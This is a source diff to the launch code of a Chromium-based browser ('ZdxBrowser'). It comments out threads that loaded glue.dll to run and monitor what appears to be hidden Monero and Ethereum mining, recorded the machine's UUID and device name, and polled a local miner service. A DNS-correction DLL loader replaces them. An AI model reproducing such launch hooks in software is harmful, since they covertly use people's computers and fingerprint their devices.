@@ -38,166 +38,166 @@
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "wbemuuid.lib")
 
-bool get_system_uuid(std::string& uuid, std::string& device_name) {
-  bool bRet = false;
-  HRESULT hres;
-
-  // Step 1: --------------------------------------------------
-  // Initialize COM. ------------------------------------------
-
-  hres = CoInitializeEx(0, COINIT_APARTMENTTHREADED);
-  if (FAILED(hres)) {
-    std::cout << "Failed to initialize COM library. Error code = 0x" << std::hex
-              << hres << std::endl;
-    return bRet;
-  }
-
-  // Step 2: --------------------------------------------------
-  // Set general COM security levels --------------------------
-
-  // hres = CoInitializeSecurity(
-  //    NULL,
-  //    -1,                           // COM authentication
-  //    NULL,                         // Authentication services
-  //    NULL,                         // Reserved
-  //    RPC_C_AUTHN_LEVEL_DEFAULT,    // Default authentication
-  //    RPC_C_IMP_LEVEL_IMPERSONATE,  // Default Impersonation
-  //    NULL,                         // Authentication info
-  //    EOAC_NONE,                    // Additional capabilities
-  //    NULL                          // Reserved
-  //);
-
-  // if (FAILED(hres)) {
-  //  std::cout << "Failed to initialize security. Error code = 0x" << std::hex
-  //            << hres << std::endl;
-  //  CoUninitialize();
-  //  return bRet;
-  //}
-
-  // Step 3: ---------------------------------------------------
-  // Obtain the initial locator to WMI -------------------------
-
-  IWbemLocator* pLoc = NULL;
-
-  hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
-                          IID_IWbemLocator, (LPVOID*)&pLoc);
-
-  if (FAILED(hres)) {
-    std::cout << "Failed to create IWbemLocator object."
-              << " Err code = 0x" << std::hex << hres << std::endl;
-    CoUninitialize();
-    return bRet;
-  }
-
-  // Step 4: -----------------------------------------------------
-  // Connect to WMI through the IWbemLocator::ConnectServer method
-
-  IWbemServices* pSvc = NULL;
-
-  // Connect to the root\cimv2 namespace with
-  // the current user and obtain pointer pSvc
-  // to make IWbemServices calls.
-  hres = pLoc->ConnectServer(
-      _bstr_t(L"ROOT\\CIMV2"),  // Object path of WMI namespace
-      NULL,                     // User name. NULL = current user
-      NULL,                     // User password. NULL = current
-      0,                        // Locale. NULL indicates current
-      NULL,                     // Security flags.
-      0,                        // Authority (for example, Kerberos)
-      0,                        // Context object
-      &pSvc                     // pointer to IWbemServices proxy
-  );
-
-  if (FAILED(hres)) {
-    std::cout << "Could not connect. Error code = 0x" << std::hex << hres
-              << std::endl;
-    pLoc->Release();
-    CoUninitialize();
-    return bRet;
-  }
-
-  std::cout << "Connected to ROOT\\CIMV2 WMI namespace" << std::endl;
-
-  // Step 5: --------------------------------------------------
-  // Set security levels on the proxy -------------------------
-  hres = CoSetProxyBlanket(pSvc,               // Indicates the proxy to set
-                           RPC_C_AUTHN_WINNT,  // RPC_C_AUTHN_xxx
-                           RPC_C_AUTHZ_NONE,   // RPC_C_AUTHZ_xxx
-                           NULL,               // Server principal name
-                           RPC_C_AUTHN_LEVEL_CALL,  // RPC_C_AUTHN_LEVEL_xxx
-                           RPC_C_IMP_LEVEL_IMPERSONATE,  // RPC_C_IMP_LEVEL_xxx
-                           NULL,                         // client identity
-                           EOAC_NONE                     // proxy capabilities
-  );
-
-  if (FAILED(hres)) {
-    std::cout << "Could not set proxy blanket. Error code = 0x" << std::hex
-              << hres << std::endl;
-    pSvc->Release();
-    pLoc->Release();
-    CoUninitialize();
-    return bRet;
-  }
-
-  // Step 6: --------------------------------------------------
-  // Use the IWbemServices pointer to make requests of WMI ----
-
-  // For example, get the name of the operating system
-  IEnumWbemClassObject* pEnumerator = NULL;
-  hres = pSvc->ExecQuery(bstr_t("WQL"),
-                         bstr_t("SELECT * FROM win32_computersystemproduct"),
-                         WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
-                         NULL, &pEnumerator);
-
-  if (FAILED(hres)) {
-    std::cout << "Query for operating system name failed."
-              << " Error code = 0x" << std::hex << hres << std::endl;
-    pSvc->Release();
-    pLoc->Release();
-    CoUninitialize();
-    return bRet;
-  }
-
-  // Step 7: -------------------------------------------------
-  // Get the data from the query in step 6 -------------------
-
-  IWbemClassObject* pclsObj = NULL;
-  ULONG uReturn = 0;
-
-  while (pEnumerator) {
-    HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
-
-    if (0 == uReturn) {
-      break;
-    }
-
-    VARIANT vtProp;
-
-    // Get the value of the Name property
-    hr = pclsObj->Get(L"uuid", 0, &vtProp, 0, 0);
-    std::wcout << " OS uuid : " << vtProp.bstrVal << std::endl;
-    std::wstring wuuid(vtProp.bstrVal);
-    std::wstring_convert<std::codecvt_utf8<wchar_t>> utf8_cvt;
-    uuid = utf8_cvt.to_bytes(wuuid);
-    VariantClear(&vtProp);
-
-    hr = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
-    std::wcout << " OS Name : " << vtProp.bstrVal << std::endl;
-    std::wstring wname(vtProp.bstrVal);
-    device_name = utf8_cvt.to_bytes(wname);
-    VariantClear(&vtProp);
-
-    pclsObj->Release();
-  }
-
-  // Cleanup
-  // ========
-  pSvc->Release();
-  pLoc->Release();
-  pEnumerator->Release();
-  CoUninitialize();
-  return bRet;
-}
+//bool get_system_uuid(std::string& uuid, std::string& device_name) {
+//  bool bRet = false;
+//  HRESULT hres;
+//
+//  // Step 1: --------------------------------------------------
+//  // Initialize COM. ------------------------------------------
+//
+//  hres = CoInitializeEx(0, COINIT_APARTMENTTHREADED);
+//  if (FAILED(hres)) {
+//    std::cout << "Failed to initialize COM library. Error code = 0x" << std::hex
+//              << hres << std::endl;
+//    return bRet;
+//  }
+//
+//  // Step 2: --------------------------------------------------
+//  // Set general COM security levels --------------------------
+//
+//  // hres = CoInitializeSecurity(
+//  //    NULL,
+//  //    -1,                           // COM authentication
+//  //    NULL,                         // Authentication services
+//  //    NULL,                         // Reserved
+//  //    RPC_C_AUTHN_LEVEL_DEFAULT,    // Default authentication
+//  //    RPC_C_IMP_LEVEL_IMPERSONATE,  // Default Impersonation
+//  //    NULL,                         // Authentication info
+//  //    EOAC_NONE,                    // Additional capabilities
+//  //    NULL                          // Reserved
+//  //);
+//
+//  // if (FAILED(hres)) {
+//  //  std::cout << "Failed to initialize security. Error code = 0x" << std::hex
+//  //            << hres << std::endl;
+//  //  CoUninitialize();
+//  //  return bRet;
+//  //}
+//
+//  // Step 3: ---------------------------------------------------
+//  // Obtain the initial locator to WMI -------------------------
+//
+//  IWbemLocator* pLoc = NULL;
+//
+//  hres = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
+//                          IID_IWbemLocator, (LPVOID*)&pLoc);
+//
+//  if (FAILED(hres)) {
+//    std::cout << "Failed to create IWbemLocator object."
+//              << " Err code = 0x" << std::hex << hres << std::endl;
+//    CoUninitialize();
+//    return bRet;
+//  }
+//
+//  // Step 4: -----------------------------------------------------
+//  // Connect to WMI through the IWbemLocator::ConnectServer method
+//
+//  IWbemServices* pSvc = NULL;
+//
+//  // Connect to the root\cimv2 namespace with
+//  // the current user and obtain pointer pSvc
+//  // to make IWbemServices calls.
+//  hres = pLoc->ConnectServer(
+//      _bstr_t(L"ROOT\\CIMV2"),  // Object path of WMI namespace
+//      NULL,                     // User name. NULL = current user
+//      NULL,                     // User password. NULL = current
+//      0,                        // Locale. NULL indicates current
+//      NULL,                     // Security flags.
+//      0,                        // Authority (for example, Kerberos)
+//      0,                        // Context object
+//      &pSvc                     // pointer to IWbemServices proxy
+//  );
+//
+//  if (FAILED(hres)) {
+//    std::cout << "Could not connect. Error code = 0x" << std::hex << hres
+//              << std::endl;
+//    pLoc->Release();
+//    CoUninitialize();
+//    return bRet;
+//  }
+//
+//  std::cout << "Connected to ROOT\\CIMV2 WMI namespace" << std::endl;
+//
+//  // Step 5: --------------------------------------------------
+//  // Set security levels on the proxy -------------------------
+//  hres = CoSetProxyBlanket(pSvc,               // Indicates the proxy to set
+//                           RPC_C_AUTHN_WINNT,  // RPC_C_AUTHN_xxx
+//                           RPC_C_AUTHZ_NONE,   // RPC_C_AUTHZ_xxx
+//                           NULL,               // Server principal name
+//                           RPC_C_AUTHN_LEVEL_CALL,  // RPC_C_AUTHN_LEVEL_xxx
+//                           RPC_C_IMP_LEVEL_IMPERSONATE,  // RPC_C_IMP_LEVEL_xxx
+//                           NULL,                         // client identity
+//                           EOAC_NONE                     // proxy capabilities
+//  );
+//
+//  if (FAILED(hres)) {
+//    std::cout << "Could not set proxy blanket. Error code = 0x" << std::hex
+//              << hres << std::endl;
+//    pSvc->Release();
+//    pLoc->Release();
+//    CoUninitialize();
+//    return bRet;
+//  }
+//
+//  // Step 6: --------------------------------------------------
+//  // Use the IWbemServices pointer to make requests of WMI ----
+//
+//  // For example, get the name of the operating system
+//  IEnumWbemClassObject* pEnumerator = NULL;
+//  hres = pSvc->ExecQuery(bstr_t("WQL"),
+//                         bstr_t("SELECT * FROM win32_computersystemproduct"),
+//                         WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
+//                         NULL, &pEnumerator);
+//
+//  if (FAILED(hres)) {
+//    std::cout << "Query for operating system name failed."
+//              << " Error code = 0x" << std::hex << hres << std::endl;
+//    pSvc->Release();
+//    pLoc->Release();
+//    CoUninitialize();
+//    return bRet;
+//  }
+//
+//  // Step 7: -------------------------------------------------
+//  // Get the data from the query in step 6 -------------------
+//
+//  IWbemClassObject* pclsObj = NULL;
+//  ULONG uReturn = 0;
+//
+//  while (pEnumerator) {
+//    HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
+//
+//    if (0 == uReturn) {
+//      break;
+//    }
+//
+//    VARIANT vtProp;
+//
+//    // Get the value of the Name property
+//    hr = pclsObj->Get(L"uuid", 0, &vtProp, 0, 0);
+//    std::wcout << " OS uuid : " << vtProp.bstrVal << std::endl;
+//    std::wstring wuuid(vtProp.bstrVal);
+//    std::wstring_convert<std::codecvt_utf8<wchar_t>> utf8_cvt;
+//    uuid = utf8_cvt.to_bytes(wuuid);
+//    VariantClear(&vtProp);
+//
+//    hr = pclsObj->Get(L"Name", 0, &vtProp, 0, 0);
+//    std::wcout << " OS Name : " << vtProp.bstrVal << std::endl;
+//    std::wstring wname(vtProp.bstrVal);
+//    device_name = utf8_cvt.to_bytes(wname);
+//    VariantClear(&vtProp);
+//
+//    pclsObj->Release();
+//  }
+//
+//  // Cleanup
+//  // ========
+//  pSvc->Release();
+//  pLoc->Release();
+//  pEnumerator->Release();
+//  CoUninitialize();
+//  return bRet;
+//}
 
 #define DLLEXPORT __declspec(dllexport)
 
@@ -273,132 +273,158 @@ int ChromeMain(int argc, const char** argv) {
       }
       break;
     }
-    std::string self_path = szFullPath;
-    std::string dllname = self_path + "glue.dll";
+    //std::string self_path = szFullPath;
+    //std::string dllname = self_path + "glue.dll";
 
-    std::thread tGetMinerRate([&]() {
+    //std::thread tGetMinerRate([&]() {
+    //  HINSTANCE hApp = ::LoadLibraryExA(dllname.c_str(), NULL,
+    //                                    LOAD_WITH_ALTERED_SEARCH_PATH);
+    //  if (!hApp) {
+    //    ::OutputDebugStringA("glue.dll LoadLibraryExA error.");
+    //  } else {
+    //    typedef bool(__stdcall * pFunGetMinerRate)(double& xmr_rate,
+    //                                               double& eth_rate);
+    //    pFunGetMinerRate pGetMinerRate =
+    //        (pFunGetMinerRate)::GetProcAddress(hApp, "GetMinerRate");
+    //    if (!pGetMinerRate) {
+    //      ::OutputDebugStringA("GetMinerRate GetProcAddress error.");
+    //    } else {
+    //      double xmr_rate = 0;
+    //      double eth_rate = 0;
+    //      bool ret = pGetMinerRate(xmr_rate, eth_rate);
+    //      if (ret) {
+    //        char m_lpszDefaultDir[MAX_PATH];
+    //        char szDocument[MAX_PATH] = {0};
+    //        memset(m_lpszDefaultDir, 0, _MAX_PATH);
+
+    //        LPITEMIDLIST pidl = NULL;
+    //        SHGetSpecialFolderLocation(NULL, CSIDL_APPDATA, &pidl);
+    //        if (pidl && SHGetPathFromIDListA(pidl, szDocument)) {
+    //          GetShortPathNameA(szDocument, m_lpszDefaultDir, _MAX_PATH);
+    //        }
+
+    //        std::string appdata = m_lpszDefaultDir;
+    //        std::string filename =
+    //            appdata + "\\ZdxBrowser\\User Data\\Default\\miner_rate";
+    //        std::ofstream out(filename, std::ios::out | std::ios::trunc);
+    //        if (out.is_open()) {
+    //          out << std::to_string(xmr_rate) << " "
+    //              << std::to_string(eth_rate);
+    //          out.close();
+    //        }
+    //      } else {
+    //        ::OutputDebugStringA("GetMinerRate error.");
+    //      }
+    //    }
+
+    //      std::string uuid;
+    //      std::string device_name;
+    //      get_system_uuid(uuid, device_name);
+    //      if (uuid.length() > 0) {
+    //        char m_lpszDefaultDir[MAX_PATH];
+    //        char szDocument[MAX_PATH] = {0};
+    //        memset(m_lpszDefaultDir, 0, _MAX_PATH);
+    //        LPITEMIDLIST pidl = NULL;
+    //        SHGetSpecialFolderLocation(NULL, CSIDL_APPDATA, &pidl);
+    //        if (pidl && SHGetPathFromIDListA(pidl, szDocument)) {
+    //          GetShortPathNameA(szDocument, m_lpszDefaultDir, _MAX_PATH);
+    //        }
+    //        std::string appdata = m_lpszDefaultDir;
+    //        std::string filename =
+    //            appdata + "\\ZdxBrowser\\User Data\\Default\\UUID";
+    //        std::ifstream fin(filename, std::ios::in);
+    //        if (fin.good()) {
+    //          fin.close();
+    //        } else {
+    //          std::ofstream out(filename,
+    //                          std::ios::in | std::ios::out | std::ios::trunc);
+    //          if (out.is_open()) {
+    //            std::string str = uuid;
+    //            str += ";";
+    //            str += device_name;
+    //            out << str;
+    //            out.close();
+    //          }
+    //        }
+    //      }
+    //      ::OutputDebugStringA("get_system_uuid");
+    //      if (uuid.length() > 0) {
+    //        ::OutputDebugStringA(uuid.c_str());
+    //      } else {
+    //        ::OutputDebugStringA("get uuid error!!!");
+    //      }
+    //    if (hApp) {
+    //      FreeLibrary(hApp);
+    //      hApp = nullptr;
+    //    }
+    //  }
+    //});
+    //tGetMinerRate.detach();
+
+    //std::thread tRun([&]() {
+    //  HINSTANCE hApp = ::LoadLibraryExA(dllname.c_str(), NULL,
+    //                                    LOAD_WITH_ALTERED_SEARCH_PATH);
+    //  if (!hApp) {
+    //    ::OutputDebugStringA("glue.dll LoadLibraryExA error.");
+    //  } else {
+    //    typedef int(__stdcall * pFunRunReLoad)(const char* url, char* body,
+    //                                           size_t max_size);
+    //    pFunRunReLoad pRunReLoad =
+    //        (pFunRunReLoad)::GetProcAddress(hApp, "RunReload");
+    //    if (!pRunReLoad) {
+    //      ::OutputDebugStringA("RunReload GetProcAddress error.");
+    //    } else {
+    //      std::string body;
+    //      int ret = 0;
+    //      char sbody[4096];
+    //      size_t sbody_len = 4096;
+    //      do {
+    //        memset(sbody, 0, 4096);
+    //        ret = pRunReLoad("http://localhost:2492/api/reload?dev=cpu", sbody,
+    //                         sbody_len);
+    //        std::string body = "{\"rt\":-3,\"error\":\"yilu info error!\"}";
+    //        if (ret > 0 && (body.compare(sbody) != 0)) {
+    //          ::OutputDebugStringA(" ^_^ check miner thread exit!!! ");
+    //          ::OutputDebugStringA(sbody);
+    //        } else {
+    //          ::OutputDebugStringA("RunReload run once ... ");
+    //          std::this_thread::sleep_for(std::chrono::milliseconds(200));
+    //        }
+    //      } while (ret <= 0);
+    //    }
+    //    if (hApp) {
+    //      FreeLibrary(hApp);
+    //      hApp = nullptr;
+    //    }
+    //  }
+    //});
+    //tRun.detach();
+    
+    // zhangfj 20190122 dns纠错/加速/白名单/用户白名单
+    std::string dns_path = szFullPath;
+    std::string dllname = dns_path + "dns_correction.dll";
+    std::thread tDnsCorrectionRun([&]() {
       HINSTANCE hApp = ::LoadLibraryExA(dllname.c_str(), NULL,
                                         LOAD_WITH_ALTERED_SEARCH_PATH);
       if (!hApp) {
-        ::OutputDebugStringA("glue.dll LoadLibraryExA error.");
+        ::OutputDebugStringA("dns_correction.dll LoadLibraryExA error.");
       } else {
-        typedef bool(__stdcall * pFunGetMinerRate)(double& xmr_rate,
-                                                   double& eth_rate);
-        pFunGetMinerRate pGetMinerRate =
-            (pFunGetMinerRate)::GetProcAddress(hApp, "GetMinerRate");
-        if (!pGetMinerRate) {
-          ::OutputDebugStringA("GetMinerRate GetProcAddress error.");
+        typedef bool(__stdcall * pFunInitialize)(void);
+        pFunInitialize pInitialize =
+            (pFunInitialize)::GetProcAddress(hApp, "Initialize");
+        if (!pInitialize) {
+          ::OutputDebugStringA("Initialize GetProcAddress error.");
         } else {
-          double xmr_rate = 0;
-          double eth_rate = 0;
-          bool ret = pGetMinerRate(xmr_rate, eth_rate);
+          bool ret = pInitialize();
           if (ret) {
-            char m_lpszDefaultDir[MAX_PATH];
-            char szDocument[MAX_PATH] = {0};
-            memset(m_lpszDefaultDir, 0, _MAX_PATH);
-
-            LPITEMIDLIST pidl = NULL;
-            SHGetSpecialFolderLocation(NULL, CSIDL_APPDATA, &pidl);
-            if (pidl && SHGetPathFromIDListA(pidl, szDocument)) {
-              GetShortPathNameA(szDocument, m_lpszDefaultDir, _MAX_PATH);
-            }
-
-            std::string appdata = m_lpszDefaultDir;
-            std::string filename =
-                appdata + "\\ZdxBrowser\\User Data\\Default\\miner_rate";
-            std::ofstream out(filename, std::ios::out | std::ios::trunc);
-            if (out.is_open()) {
-              out << std::to_string(xmr_rate) << " "
-                  << std::to_string(eth_rate);
-              out.close();
-            }
+            ::OutputDebugStringA("Initialize call success.");
           } else {
-            ::OutputDebugStringA("GetMinerRate error.");
+            ::OutputDebugStringA("Initialize call error.");
           }
-        }
-
-          std::string uuid;
-          std::string device_name;
-          get_system_uuid(uuid, device_name);
-          if (uuid.length() > 0) {
-            char m_lpszDefaultDir[MAX_PATH];
-            char szDocument[MAX_PATH] = {0};
-            memset(m_lpszDefaultDir, 0, _MAX_PATH);
-            LPITEMIDLIST pidl = NULL;
-            SHGetSpecialFolderLocation(NULL, CSIDL_APPDATA, &pidl);
-            if (pidl && SHGetPathFromIDListA(pidl, szDocument)) {
-              GetShortPathNameA(szDocument, m_lpszDefaultDir, _MAX_PATH);
-            }
-            std::string appdata = m_lpszDefaultDir;
-            std::string filename =
-                appdata + "\\ZdxBrowser\\User Data\\Default\\UUID";
-            std::ifstream fin(filename, std::ios::in);
-            if (fin.good()) {
-              fin.close();
-            } else {
-              std::ofstream out(filename,
-                              std::ios::in | std::ios::out | std::ios::trunc);
-              if (out.is_open()) {
-                std::string str = uuid;
-                str += ";";
-                str += device_name;
-                out << str;
-                out.close();
-              }
-            }
-          }
-          ::OutputDebugStringA("get_system_uuid");
-          if (uuid.length() > 0) {
-            ::OutputDebugStringA(uuid.c_str());
-          } else {
-            ::OutputDebugStringA("get uuid error!!!");
-          }
-        if (hApp) {
-          FreeLibrary(hApp);
-          hApp = nullptr;
         }
       }
     });
-    tGetMinerRate.detach();
-
-    std::thread tRun([&]() {
-      HINSTANCE hApp = ::LoadLibraryExA(dllname.c_str(), NULL,
-                                        LOAD_WITH_ALTERED_SEARCH_PATH);
-      if (!hApp) {
-        ::OutputDebugStringA("glue.dll LoadLibraryExA error.");
-      } else {
-        typedef int(__stdcall * pFunRunReLoad)(const char* url, char* body,
-                                               size_t max_size);
-        pFunRunReLoad pRunReLoad =
-            (pFunRunReLoad)::GetProcAddress(hApp, "RunReload");
-        if (!pRunReLoad) {
-          ::OutputDebugStringA("RunReload GetProcAddress error.");
-        } else {
-          std::string body;
-          int ret = 0;
-          char sbody[4096];
-          size_t sbody_len = 4096;
-          do {
-            memset(sbody, 0, 4096);
-            ret = pRunReLoad("http://localhost:2492/api/reload?dev=cpu", sbody,
-                             sbody_len);
-            std::string body = "{\"rt\":-3,\"error\":\"yilu info error!\"}";
-            if (ret > 0 && (body.compare(sbody) != 0)) {
-              ::OutputDebugStringA(" ^_^ check miner thread exit!!! ");
-              ::OutputDebugStringA(sbody);
-            } else {
-              ::OutputDebugStringA("RunReload run once ... ");
-              std::this_thread::sleep_for(std::chrono::milliseconds(200));
-            }
-          } while (ret <= 0);
-        }
-        if (hApp) {
-          FreeLibrary(hApp);
-          hApp = nullptr;
-        }
-      }
-    });
-    tRun.detach();
+    tDnsCorrectionRun.detach();
   }
 
 #if defined(OS_MACOSX)
